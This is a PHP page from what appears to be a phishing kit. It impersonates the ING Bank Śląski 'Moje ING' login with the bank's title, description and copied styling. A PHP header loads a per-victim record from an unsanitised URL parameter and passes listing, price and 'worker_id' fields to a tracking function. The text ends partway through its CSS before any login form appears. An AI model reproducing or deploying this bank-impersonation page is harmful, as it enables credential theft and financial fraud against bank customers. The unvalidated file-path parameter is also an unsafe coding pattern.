<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "ING Bank.");
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Moje ING | ING Bank Śląski – Moje ING</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
    <meta name="description" content="Nowa bankowość internetowa i mobilna ING Banku Śląskiego. Bankuj po swojemu, tak jak lubisz. Zaloguj się.">
</head>

  <body class="ing-new-theme">
    <style>
      @-ms-viewport {
        height: device-height;
        width: device-width
      }
	  .loginboxes {
				display: flex;
			}
		@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}	
      
      div#content_wrapper {
        margin-left: -2rem;
        margin-right: -2rem;
        overflow: hidden;
        clear: both
      }
      
      #content_wrapper A {
        color: #FF6200
      }
      
      #content_wrapper A:hover {
        text-decoration: underline;
        color: #FF6200
      }
      
      #content_wrapper .content_area A:hover:not(.button):after,
      #content_wrapper .content_area A:hover:not(.button):before,
      #content_wrapper A:active {
        text-decoration: none
      }
      
      @media print {
        #content_wrapper A:after {
          content: ""!important
        }
      }
      
      #content_wrapper A:focus {
        text-align: none!important;
        outline: 0
      }
      
      #content_wrapper P {
        margin-top: 0;
        margin-bottom: 1em
      }
      
      #content_wrapper .content_area {
        font-weight: 300
      }
      
      #content_wrapper .content_area A {
        font-weight: 400;
        font-size: inherit
      }
      
      #content_wrapper .clearFix {
        clear: both!important;
        font-size: 0;
        line-height: 0;
        height: 0
      }
      
      #content_wrapper>.layout_section:first-child>.layout_row:first-child {
        border: none
      }
      
      #content_wrapper .layout_row {
        border-style: solid;
        border-width: 1px 0 0;
        border-color: #ddd
      }
      
      #content_wrapper .layout_row>.layout_column:last-child {
        background-position: 100% 0
      }
      
      #content_wrapper .layout_row>.layout_column:only-child>div {
        background-position: -15px 1px
      }
      
      #content_wrapper A.link {
        margin-left: 10px;
        margin-right: 10px;
        cursor: pointer
      }
      
      #content_wrapper A.link:first-child {
        margin-left: 0
      }
      
      #content_wrapper A.link:last-child {
        margin-right: 0
      }
      
      #content_wrapper A.link:after {
        font-family: fontello_epoint;
        content: '\e800';
        margin-left: 10px;
        font-size: 12px;
        color: #FF6200
      }
      
      h1,
      h2,
      input {
        color: inherit
      }
      
      #content_wrapper .component_wrapper>.component.content {
        padding-top: 3em;
        padding-bottom: 1.5em
      }
      
      #content_wrapper .layout_row .layout_column:first-child .component_wrapper>.component.content {
        padding-left: 30px;
        padding-right: 15px
      }
      
      #content_wrapper .layout_row .layout_column:last-child .component_wrapper>.component.content,
      #content_wrapper .layout_row .layout_column:only-child .component_wrapper>.component.content {
        padding-right: 30px
      }
      
      #content_wrapper .component.content .content_area {
        line-height: 1.5
      }
      
      @media only screen and (max-width:767px) {
        #content_wrapper A.link {
          display: inline-block;
          background: #fff
        }
        #content_wrapper .layout_row .layout_column:first-child .component_wrapper>.component.content,
        #content_wrapper .layout_row .layout_column:only-child .component_wrapper>.component.content {
          padding: 2em 20px 1em
        }
        #content_wrapper .component.content .content_area {
          line-height: 20px
        }
      }
      
      html {
        font-family: sans-serif
      }
      
      footer,
      header,
      section {
        display: block
      }
      
      a:active,
      a:hover {
        outline: currentcolor 0
      }
      
      h1 {
        margin: .67em 0
      }
      
      img {
        border: 0;
        vertical-align: middle
      }
      
      input {
        font: inherit;
        margin: 0
      }
      
      input[type=submit] {
        appearance: button;
        cursor: pointer
      }
      
      input::-moz-focus-inner {
        border: 0;
        padding: 0
      }
      
      @media print {
        *,
        ::after,
        ::before {
          background: 0 0!important;
          box-shadow: none!important;
          color: #000!important;
          text-shadow: none!important
        }
        a,
        a:visited {
          text-decoration: underline
        }
        a[href]::after {
          content: " (" attr(href) ")"
        }
        a[href^="#"]::after {
          content: ""
        }
        img {
          break-inside: avoid;
          max-width: 100%!important
        }
        h2 {
          break-after: avoid
        }
        .navbar {
          display: none
        }
      }
      
      @font-face {
        font-family: Glyphicons Halflings;
        src: url(5be1347c682810f199c7.eot) format("embedded-opentype"), url(82b1212e45a2bc35dd73.woff) format("woff"), url(4692b9ec53fd5972caa2.ttf) format("truetype"), url(9a17786234899efcc963.svg) format("svg")
      }
      
      *,
      ::after,
      ::before {
        box-sizing: border-box
      }
      
      html {
        font-size: 10px
      }
      
      body {
        margin: 0;
        background-color: #fff;
        color: #333;
        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 14px;
        line-height: 1.42857
      }
      
      h1,
      h2,
      input {
        font-family: inherit
      }
      
      input {
        font-size: inherit;
        line-height: inherit
      }
      
      a {
        background-color: transparent;
        color: #428bca;
        text-decoration: none
      }
      
      a:focus,
      a:hover {
        color: #2a6496;
        text-decoration: underline
      }
      
      a:focus {
        outline: currentcolor dotted thin;
        outline-offset: -2px
      }
      
      .sr-only {
        clip: rect(0, 0, 0, 0);
        border: 0;
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px
      }
      
      h1,
      h2,
      ul {
        margin-bottom: 10px
      }
      
      h1,
      h2 {
        font-weight: 500;
        line-height: 1.1;
        margin-top: 20px
      }
      
      h1 {
        font-size: 36px
      }
      
      h2 {
        font-size: 30px
      }
      
      p {
        margin: 0 0 10px
      }
      
      ul {
        margin-top: 0
      }
      
      ul ul {
        margin-bottom: 0
      }
      
      .container {
        margin-left: auto;
        margin-right: auto;
        padding-left: 15px;
        padding-right: 15px
      }
      
      @media (min-width:768px) {
        .container {
          width: 750px
        }
      }
      
      @media (min-width:1200px) {
        .container {
          width: 1170px
        }
        .col-lg-12 {
          float: left;
          width: 100%
        }
      }
      
      .row {
        margin-left: -15px;
        margin-right: -15px
      }
      
      .col-lg-12,
      .col-md-12,
      .col-sm-12,
      .col-xs-12 {
        min-height: 1px;
        padding-left: 15px;
        padding-right: 15px;
        position: relative
      }
      
      .col-xs-12 {
        float: left;
        width: 100%
      }
      
      .form-control {
        color: #555;
        display: block;
        font-size: 14px;
        line-height: 1.42857;
        background-color: #fff;
        background-image: none;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-shadow: rgba(0, 0, 0, .075) 0 1px 1px inset;
        height: 34px;
        padding: 6px 12px;
        transition: border-color .15s ease-in-out 0s, box-shadow .15s ease-in-out 0s;
        width: 100%
      }
      
      .form-control:focus {
        border-color: #66afe9;
        box-shadow: rgba(0, 0, 0, .075) 0 1px 1px inset, rgba(102, 175, 233, .6) 0 0 8px;
        outline: currentcolor 0
      }
      
      .form-control::-webkit-input-placeholder {
        color: #999
      }
      
      .ing-new-theme a,
      .ing-new-theme a:hover,
      .ing-new-theme h1,
      .ing-new-theme h2 {
        color: #333
      }
      
      .form-group {
        margin-bottom: 15px
      }
      
      .navbar {
        border: 1px solid transparent;
        margin-bottom: 20px;
        min-height: 50px;
        position: relative
      }
      
      .container::after,
      .container::before,
      .navbar::after,
      .navbar::before,
      .row::after,
      .row::before {
        content: " ";
        display: table
      }
      
      .hidden,
      .visible-xs-block {
        display: none!important
      }
      
      .container::after,
      .navbar::after,
      .row::after {
        clear: both
      }
      
      .hidden {
        visibility: hidden!important
      }
      
      html {
        height: 100%
      }
      
      body.ing-new-theme {
        background: #fff;
        color: #333;
        font-family: INGMe, sans-serif;
        font-size: 16px;
        font-weight: 400;
        height: 100%;
        line-height: 1.5
      }
      
      .ing-new-theme #layout-region>div .region-wrapper {
        margin: 0 auto;
        min-height: calc(-125px + 100vh);
        position: relative
      }
      
      .ing-new-theme h1 {
        font-size: 2.8rem;
        font-weight: 400;
        line-height: 3.6rem
      }
      
      @media (min-width:768px) {
        .col-md-12,
        .col-sm-12 {
          float: left;
          width: 100%
        }
        .navbar {
          border-radius: 4px
        }
        .ing-new-theme h1 {
          font-size: 3.6rem;
          line-height: 4.4rem
        }
      }
      
      .ing-new-theme h2 {
        font-size: 2.6rem;
        font-weight: 600;
        line-height: 2.8rem
      }
      
      .ing-new-theme a {
        cursor: pointer;
        transition: color .25s ease-out 0s
      }
      
      .ing-new-theme a:active,
      .ing-new-theme a:focus,
      .ing-new-theme a:hover {
        text-decoration: none
      }
      
      .ing-new-theme .ing-container {
        padding: 0
      }
      
      .ing-new-theme a:focus {
        outline: currentcolor
      }
      
      .ing-new-theme input[type=password] {
        font-family: Arial, sans-serif
      }
      
      .ing-new-theme .box {
        background-color: #fff;
        border: .1rem solid #d9d9d9;
        border-radius: .8rem;
        box-shadow: #f0f0f0 0 .3rem 0 0, #fff 0 -.5rem 0 0
      }
      
      @media (max-width:767px) {
        .visible-xs-block {
          display: block!important
        }
        .hidden-xs {
          display: none!important
        }
        body.ing-new-theme {
          background-color: #fff;
          inset: 0;
          font-size: 1.4rem;
          position: absolute;
          width: 100%
        }
        .ing-new-theme #layout-region {
          position: relative;
          will-change: overflow-y
        }
        .ing-new-theme #layout-region>div .region-wrapper,
        .ing-new-theme #layout-region>div.login-layout .region-wrapper {
          margin: 0 auto
        }
        .ing-new-theme h1 {
          font-size: 3rem;
          line-height: 3.2rem
        }
        .ing-new-theme h2 {
          font-size: 2.2rem;
          line-height: 2.4rem
        }
        .ing-new-theme a:active,
        .ing-new-theme a:focus {
          color: #ff6200
        }
      }
      
      @media screen and (min-width:768px) and (max-width:1199px) {
        .ing-new-theme .container,
        .ing-new-theme .ing-container {
          width: 100%
        }
        .ing-new-theme a:active,
        .ing-new-theme a:focus,
        .ing-new-theme a:hover {
          color: #ff6200
        }
      }
      
      @media (min-width:1200px) {
        .ing-new-theme #layout-region {
          overflow-x: hidden
        }
        .ing-new-theme a:active,
        .ing-new-theme a:focus,
        .ing-new-theme a:hover {
          color: #ff6200
        }
      }
            @font-face {
        font-family: ing-icons;
        src: url(c9bd620db5f1f56446b4.eot) format("embedded-opentype"), url(07f4ccc633485cc16aa1.woff) format("woff"), url(ing-style-6.ttf) format("truetype"), url(c2f759496541b0e68295.svg) format("svg")
      }
      .ing-new-theme [class*=glyphicon-ing-] {
        font-family: ing-icons;
        font-style: normal
      }
      
      .ing-new-theme .glyphicon-ing-blocked2::before {
        content: ""
      }
      
      .ing-new-theme .glyphicon-ing-key::before {
        content: ""
      }
      
      .ing-new-theme .glyphicon-ing-en::before {
        content: ""
      }
      
      .ing-new-theme .glyphicon-ing-e916::before {
        content: ""
      }
      
      .ing-new-theme .link.link {
        border-bottom: medium none;
        color: #ff6200;
        cursor: pointer;
        display: inline-block;
        font-size: 1.6rem;
        font-weight: 400;
        line-height: 2.4rem;
        position: relative;
        transition: color .25s ease-out 0s, text-decoration .25s ease-out 0s, -webkit-text-decoration .25s ease-out 0s
      }
      
      .ing-new-theme .link.link:active,
      .ing-new-theme .link.link:hover {
        outline-style: none;
        text-decoration: underline
      }
      
      .ing-new-theme .link.link.inline-flex {
        align-items: flex-start;
        display: inline-flex
      }
      
      .ing-new-theme .link.link:hover {
        color: #ff6200
      }
      
      .ing-new-theme .form-group {
        margin: 0;
        padding: 0
      }
      
      .ing-new-theme .form-control {
        appearance: none;
        background-color: #fff;
        border-color: #a8a8a8;
        border-radius: .4rem;
        box-shadow: none;
        color: #333;
        font-size: 1.6rem;
        height: 4.8rem;
        line-height: 2.4rem;
        margin: 0 0 .8rem;
        padding: 1.2rem 1.6rem;
        transition: border-color .2s ease-in 0s, color .2s ease-in 0s
      }
      
      .ing-new-theme .checkbox input[type=checkbox]:hover:not(:disabled)+label::before,
      .ing-new-theme .form-control:active,
      .ing-new-theme .form-control:focus,
      .ing-new-theme .form-control:hover,
      .ing-new-theme .radio input[type=radio]:not(old):hover:not(:disabled)+label>span {
        border-color: #ff6200
      }
      
      .ing-new-theme::selection {
        background: #ff6200;
        color: #fff
      }
      
      .ing-new-theme .ing-footer {
        padding: 0 1.5rem;
        position: relative;
        transform: translateZ(0)
      }
      
      .ing-new-theme .ing-footer .footer-container {
        text-align: start
      }
      
      .ing-new-theme .ing-footer .ing-list-hybrid-container {
        margin: 1.6rem auto 0
      }
      
      .ing-new-theme .ing-footer .ing-list-inline-container {
        margin: .5rem auto
      }
      
      .ing-new-theme .ing-footer .ing-list-inline-container>span {
        color: #a8a8a8;
        font-size: 1.4rem;
        font-weight: 400;
        line-height: 2rem;
        margin-left: 1.6rem
      }
      
      .ing-new-theme .ing-footer ul {
        display: table;
        list-style: none;
        margin: 0;
        padding: 0
      }
      
      .ing-new-theme .ing-footer ul li {
        display: inline-block;
        vertical-align: middle
      }
      
      .ing-new-theme .ing-footer ul li a {
        border-bottom: medium none
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid {
        background-color: #f0f0f0;
        border-radius: .4rem;
        width: 100%
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid ul {
        width: 100%
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li {
        overflow: hidden;
        padding-left: 1.6rem;
        padding-right: 1.7rem;
        position: relative
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li a {
        color: #333;
        line-height: 48px;
        white-space: nowrap
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li a i {
        color: #ff6200
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li a:hover:not(.ing-disabled)>span {
        color: #ff6200;
        text-decoration: underline
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li a span {
        transition: all .25s ease-out 0s
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li a span:not([class]) {
        margin-left: -4px
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li:last-child {
        border-right: medium none;
        padding-right: 1.6rem
      }
      
      .ing-new-theme .ing-footer ul.ing-list-hybrid li [class*=glyphicon-ing-] {
        font-size: 2rem;
        margin: 0 1.6rem 0 0;
        position: relative;
        top: .4rem
      }
      
      .ing-new-theme .ing-footer ul.ing-list-inline {
        z-index: 30
      }
      
      .ing-new-theme .ing-footer ul.ing-list-inline li {
        color: #a8a8a8;
        padding: 0 1.6rem;
        position: relative
      }
      
      .ing-new-theme .ing-footer ul.ing-list-inline li a:hover:not(.ing-disabled) {
        text-decoration: underline
      }
      
      .ing-new-theme .ing-footer ul.ing-list-inline li a,
      .ing-new-theme .ing-footer ul.ing-list-inline li span {
        color: #a8a8a8;
        font-size: 1.4rem;
        font-weight: 400;
        line-height: 2rem
      }
      
      .ing-new-theme .ing-footer ul.ing-list-inline li:last-child {
        border-right: medium none;
        padding-right: 0
      }
      
      .ing-new-theme .ing-footer.login-layout_footer {
        padding: 0
      }
      
      @media (max-width:767px) {
        .ing-new-theme .ing-footer {
          height: auto;
          margin-top: 4rem
        }
        .ing-new-theme .ing-footer>div::after {
          inset: 0;
          content: "";
          opacity: 0;
          position: absolute;
          transition: all .1s ease-out 0s;
          z-index: -1
        }
        .ing-new-theme .ing-footer .ing-list-inline-container {
          height: auto;
          overflow-x: hidden
        }
        .ing-new-theme .ing-footer .ing-list-inline-container>span {
          color: #a8a8a8;
          display: none;
          font-size: 1.2rem;
          font-weight: 400;
          line-height: 1.6rem
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid {
          height: auto
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
          float: none;
          margin: auto 0;
          padding: 0
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li:not(:first-child) {
          border-top: 1px solid #d9d9d9
        }
        .ing-new-theme .ing-footer ul.ing-list-inline {
          margin-bottom: 1.2rem;
          padding: .8rem
        }
        .ing-new-theme .ing-footer ul.ing-list-inline li {
          padding: 0 .8rem
        }
        .ing-new-theme .ing-footer ul.ing-list-inline li a,
        .ing-new-theme .ing-footer ul.ing-list-inline li span {
          font-size: 1.2rem;
          font-weight: 400;
          line-height: 1.6rem
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid {
          padding: 0 1.6rem;
          width: 100%
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li {
          width: 100%
        }
        .ing-new-theme .ing-footer.login-layout_footer .ing-list-inline li:first-child {
          border: none;
          width: 100%
        }
      }
      
      @media (max-width:767px) and (-webkit-transform-3d) {
        .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
          padding-top: 1.2rem
        }
        @supports (flex-wrap:wrap) {
          .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
            padding-top: 0
          }
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li {
          display: block
        }
      }
      
      @media (min-width:768px) {
        .ing-new-theme .pull-right-md {
          float: right!important
        }
        .ing-new-theme .ing-footer {
          border-top-left-radius: 0;
          border-top-right-radius: 0
        }
        .ing-new-theme .ing-footer.login-layout_footer .ing-list-inline-container span {
          color: #fff
        }
        .ing-new-theme .ing-footer.login-layout_footer ul.ing-list-inline li:not(:last-child)::after {
          background-color: #d9d9d9;
          content: "";
          height: 1.6rem;
          position: absolute;
          right: 0;
          top: 50%;
          transform: translateY(-50%);
          width: 1px
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li.pull-right-md:last-child::before,
        .ing-new-theme .ing-footer ul.ing-list-hybrid li:not(.pull-right-md):first-child::before {
          display: none
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li::before {
          background-color: #d9d9d9;
          content: "";
          height: 1.6rem;
          left: 0;
          position: absolute;
          top: 50%;
          transform: translateY(-50%);
          width: 1px
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li a {
          float: left;
          overflow: hidden;
          width: 100%
        }
        .ing-new-theme .ing-footer ul.ing-list-hybrid li [class*=glyphicon-ing-] {
          top: .2rem
        }
      }
      
      @media (min-width:768px) and (-webkit-transform-3d) {
        .ing-new-theme .ing-footer .ing-list-inline-container .ing-list-inline li,
        .ing-new-theme .ing-footer .ing-list-inline-container>span {
          display: inline-block;
          line-height: 4.8rem;
          vertical-align: middle
        }
      }
      
      .ing-new-theme .ing-header .navbar {
        border: none;
        border-radius: 0;
        margin: 0;
        padding: 0
      }
      
      .ing-new-theme .ing-header .logo {
        background-color: #fff;
        font-weight: 700;
        height: 8.3rem;
        margin: 0;
        padding-left: 1.5rem;
        position: relative;
        text-align: center;
        z-index: 2
      }
      
      .ing-new-theme .ing-header .logo img {
        height: 4rem;
        margin-right: 1.2rem;
        width: 4rem
      }
      
      .ing-new-theme .ing-header .logo__link {
        background-color: #fff;
        border-bottom: medium none;
        color: #333;
        display: block;
        float: left;
        outline-style: none;
        text-align: left
      }
      
      .ing-new-theme .ing-header .logo__link:active,
      .ing-new-theme .ing-header .logo__link:focus,
      .ing-new-theme .ing-header .logo__link:hover,
      .ing-new-theme .ing-header .logo__link:visited {
        color: #333
      }
      
      @media (max-width:767px) {
        .ing-new-theme .ing-header>div:first-child {
          height: 6.4rem
        }
        .ing-new-theme .ing-header .nav-hybrid {
          backface-visibility: hidden;
          background: #fff;
          float: left;
          left: 0;
          max-height: 0;
          min-height: 0;
          position: absolute;
          top: 0;
          transform: translateZ(0);
          transform-style: preserve-3d;
          width: 100%;
          z-index: 9000
        }
        .ing-new-theme .ing-header .nav-hybrid::before {
          background: #fff;
          content: "";
          height: 5rem;
          left: 0;
          position: absolute;
          right: 0;
          top: 0;
          width: 100%
        }
        .ing-new-theme .ing-header .nav-hybrid--mobileFixed {
          position: fixed
        }
        .ing-new-theme .ing-header .logo {
          box-shadow: rgba(0, 0, 0, .2) 0 1px 8px 0, rgba(0, 0, 0, .12) 0 3px 3px -2px, rgba(0, 0, 0, .14) 0 3px 4px 0;
          height: 6.4rem;
          padding-left: .8rem;
          padding-top: .8rem;
          text-align: left;
          user-select: none
        }
        .ing-new-theme .ing-header .logo img {
          height: 3.2rem;
          margin-right: .8rem;
          width: 3.2rem
        }
        .ing-new-theme .ing-header .logo__img--logo {
          height: auto!important;
          margin-top: .2rem;
          width: 9.6rem!important
        }
        .ing-new-theme .ing-header .logo__link {
          display: inline-block;
          float: none;
          line-height: normal;
          padding: .8rem;
          width: auto
        }
      }
      
      @media (min-width:768px) {
        .ing-new-theme .ing-header .navbar {
          min-height: auto
        }
        .ing-new-theme .ing-header .nav-hybrid {
          padding: 1.3rem 1.5rem 0
        }
        .ing-new-theme .ing-header .logo {
          min-width: 13rem
        }
        .ing-new-theme .curtain-collection {
          animation-delay: 1.5s;
          animation-duration: .5s;
          animation-fill-mode: both;
          animation-name: slide-in-down
        }
      }
      
      .ing-new-theme .login-layout {
        background-color: #fff;
        min-height: 100vh
      }
      
      .ing-new-theme .login-layout_container {
        text-align: center
      }
      
      .ing-new-theme .login-layout_container .main-content {
        display: inline-block;
        text-align: left
      }
      
      .ing-new-theme .login-layout_container .main-content-wrap {
        display: table-cell;
        vertical-align: middle
      }
      
      .ing-new-theme .login-layout_container .box {
        border-radius: .4rem;
        margin-top: 2rem;
        opacity: 1;
        overflow: hidden
      }
      
      .ing-new-theme .login-layout_container .box::after,
      .ing-new-theme .login-layout_container .box::before {
        content: "";
        display: none;
        height: 2rem
      }
      
      .ing-new-theme .login-layout_container .box--before {
        padding-top: 2rem
      }
      
      .ing-new-theme .login-layout_container .box--after {
        padding-bottom: 2rem
      }
      
      .ing-new-theme .login-layout_container .box-content,
      .ing-new-theme .login-layout_container .box::after,
      .ing-new-theme .login-layout_container .box::before {
        background-color: rgba(255, 255, 255, .95)
      }
      
      .ing-new-theme .login-layout_container .box-content {
        height: 100%
      }
      
      .ing-new-theme .login-layout_container .box-content--error {
        background: rgba(255, 244, 229, .95);
        color: red
      }
      
      .ing-new-theme .login-layout_container .box-content--info {
        background-color: rgba(240, 240, 240, .95);
        color: #333
      }
      
      .ing-new-theme .login-layout .region-wrapper {
        display: block;
        height: auto;
        margin: 0 auto;
        min-height: calc(-125px + 100vh)
      }
      
      .ing-new-theme .login-layout .region-wrapper.login-layout--top .main-content-wrap {
        display: block
      }
      
      @media (max-width:767px) {
        .ing-new-theme .login-layout_container .main-content {
          display: block
        }
        .ing-new-theme .login-layout_container .main-content-wrap {
          vertical-align: top
        }
        .ing-new-theme .login-layout_container .box {
          margin-left: -1.5rem;
          margin-right: -1.5rem;
          padding-left: 1.5rem;
          padding-right: 1.5rem
        }
        .ing-new-theme .login-layout_container .box-content--error,
        .ing-new-theme .login-layout_container .box-content--info {
          margin-left: -1.5rem;
          margin-right: -1.5rem
        }
        .ing-new-theme .login-layout_container .box::after {
          height: 0
        }
      }
      
      @media screen and (min-width:768px) and (max-width:1199px) {
        .ing-new-theme .login-layout {
          background-image: url(645bc15a4e449cd3352f.jpg)
        }
      }
      
      @media screen and (min-width:768px) and (max-width:1199px) and (-webkit-min-device-pixel-ratio:2),
      screen and (min-width:768px) and (max-width:1199px) and (min-resolution:2dppx),
      screen and (min-width:768px) and (max-width:1199px) and (min-resolution:192dpi) {
        .ing-new-theme .login-layout {
          background-image: url(645bc15a4e449cd3352f.jpg)
        }
      }
      
      @media screen and (min-width:768px) and (max-width:1199px) and (-webkit-min-device-pixel-ratio:3),
      screen and (min-width:768px) and (max-width:1199px) and (min-resolution:3dppx),
      screen and (min-width:768px) and (max-width:1199px) and (min-resolution:288dpi) {
        .ing-new-theme .login-layout {
          background-image: url(645bc15a4e449cd3352f.jpg)
        }
      }
      
      @media (min-width:1200px) {
        .ing-new-theme .login-layout {
          background-image: url(21406a1dbb7009810334.jpg)
        }
        .ing-new-theme .login-layout_container .box {
          transition: opacity .25s linear 0s
        }
        .ing-new-theme .login-layout_container .box-content--error,
        .ing-new-theme .login-layout_container .box-content--info {
          transition: background .25s linear 0s
        }
        .ing-new-theme .login-layout_container .box-content>* {
          transition: opacity .25s linear 0s
        }
      }
      
      @media (min-width:1200px) and (-webkit-min-device-pixel-ratio:2),
      (min-width:1200px) and (min-resolution:2dppx),
      (min-width:1200px) and (min-resolution:192dpi) {
        .ing-new-theme .login-layout {
          background-image: url(21406a1dbb7009810334.jpg)
        }
      }
      
      @media (min-width:1200px) and (-webkit-min-device-pixel-ratio:3),
      (min-width:1200px) and (min-resolution:3dppx),
      (min-width:1200px) and (min-resolution:288dpi) {
        .ing-new-theme .login-layout {
          background-image: url(21406a1dbb7009810334.jpg)
        }
      }
      
      @keyframes slide-in-down {
        0% {
          transform: translate3d(0, -100%, 0);
          visibility: visible
        }
        100% {
          transform: translateZ(0)
        }
      }
      
      .ing-new-theme .curtain-collection {
        position: fixed;
        top: 0;
        width: 100%;
        z-index: 10000
      }
      
      .ing-new-theme .ing-login-container .content-container {
        border: 0;
        box-shadow: none;
        margin-top: 7.9rem
      }
      
      .ing-new-theme .ing-login-container .content-container::before {
        height: 2rem
      }
      
      .ing-new-theme .ing-login-container .ui-offer-box {
        max-width: 52rem;
        overflow: hidden
      }
      
      .ing-new-theme .ing-login-container .ui-offer-box .box-content {
        padding: 2.5rem 2rem
      }
      
      .ing-new-theme .login-form-container .box-content+.box-content {
        padding-top: 2rem
      }
      
      .ing-new-theme .login-form-container .box-content:empty+.box-content {
        padding-top: 0
      }
      
      .ing-new-theme .login-form-content,
      .ing-new-theme .login-form-content form {
        margin: 0 auto
      }
      
      .ing-new-theme .login-form-content form input {
        background-color: #fff
      }
      
      .ing-new-theme .login-form-content form .form-group {
        margin-bottom: 2rem
      }
      
      .ing-new-theme .login-hero h2 {
        font-size: 2rem;
        font-weight: 400;
        line-height: 1;
        margin: 0;
        padding-bottom: 2rem;
        padding-top: 1rem
      }
      
      .ing-new-theme .login_mobile-apps h2 {
        font-size: 1.6rem;
        font-weight: 700;
        line-height: 2.2rem;
        margin-top: 1.5rem
      }
      
      @media (min-width:768px) {
        .ing-new-theme .login_mobile-apps h2 {
          font-size: 1.6rem;
          line-height: 2.4rem
        }
      }
      
      .ing-new-theme .login_mobile-apps .row {
        line-height: 0;
        margin: 2rem 0 0;
        padding: 0
      }
      
      .ing-new-theme .login_mobile-apps .row>li {
        display: inline-block;
        float: none;
        margin-bottom: 2rem;
        padding: 0 1rem;
        text-align: center;
        vertical-align: bottom
      }
      
      .ing-new-theme .login_mobile-apps .row>li:last-child {
        margin-bottom: 0
      }
      
      .ing-new-theme .login_mobile-apps a {
        border: none;
        display: inline-block
      }
      
      .ing-new-theme .login_mobile-apps_icon {
        height: 4rem;
        width: 13.5rem
      }
      
      .ing-new-theme .login_mobile-apps_icon.icon-gp {
        background-image: url(ing-image-2.svg)
      }
      
      .ing-new-theme .login_mobile-apps_icon.icon-as {
        background-image: url(ing-image-1.svg)
      }
      
      .ing-new-theme .login_help {
        margin: 0 auto;
        padding-top: 1rem;
        text-align: right
      }
      
      .ing-new-theme .login_msg {
        position: relative;
        width: 100%;
        z-index: 3
      }
      
      .ing-new-theme .login_msg .security-message-container {
        line-height: 2rem;
        padding: 2.4rem 4.5rem 2rem;
        position: relative
      }
      
      .ing-new-theme .login_msg .security-message-container::before {
        background: url(ing-image-3.svg) -.4rem top repeat-x rgba(0, 0, 0, 0);
        content: "";
        height: .4rem;
        left: 2rem;
        position: absolute;
        right: 2rem;
        top: 0
      }
      
      .ing-new-theme .login_msg .security-message-container p:last-child {
        margin-bottom: 0
      }
      
      .ing-new-theme .login_msg .security-message-container p>span {
        display: table-cell;
        padding-right: 1.5rem;
        width: 10rem
      }
      
      .ing-new-theme .login_msg .security-message-container p a {
        border-bottom: medium none;
        color: #ff6200;
        cursor: pointer;
        display: table-cell;
        font-size: 1.6rem;
        font-weight: 400;
        line-height: 2.4rem;
        position: relative;
        transition: color .25s ease-out 0s, text-decoration .25s ease-out 0s, -webkit-text-decoration .25s ease-out 0s
      }
      
      .ing-new-theme .login_msg .security-message-container p a:active,
      .ing-new-theme .login_msg .security-message-container p a:hover {
        outline-style: none;
        text-decoration: underline
      }
      
      .ing-new-theme .login_msg .security-message-container p a:hover {
        color: #ff6200
      }
      
      @media (max-width:767px) {
        .ing-new-theme .ing-login-container {
          padding: 0 1.5rem 3rem
        }
        .ing-new-theme .login_msg .security-message-container {
          padding: 2.4rem 0 2rem
        }
        .ing-new-theme .login_msg .security-message-container::before {
          left: 0;
          right: 0
        }
      }
      
      @media (min-width:768px) {
        .ing-new-theme .ing-login-container {
          min-width: 52rem
        }
        .ing-new-theme .ing-login-container .content-container {
          margin-top: 2rem
        }
        .ing-new-theme .ing-login-container .content-container .logo {
          display: flex;
          justify-content: center;
          padding: 2rem 0 1rem
        }
        .ing-new-theme .ing-login-container .content-container .logo__img--logo {
          height: auto;
          width: 12.8rem
        }
        .ing-new-theme .login_msg .security-message-container {
          width: 52rem
        }
        .ing-new-theme .login-hero {
          text-align: center
        }
        .ing-new-theme .login-form-content,
        .ing-new-theme .login_help {
          max-width: 28rem
        }
      }
      
      @media (max-width:767px) {
        .ing-new-theme .login_msg .security-message-container .link,
        .ing-new-theme .login_msg .security-message-container p>span {
          display: block
        }
        .ing-new-theme .login_msg .security-message-container p>.loginPage {
          margin-top: .8rem
        }
      }
      
      .ing-new-theme .login-layout {
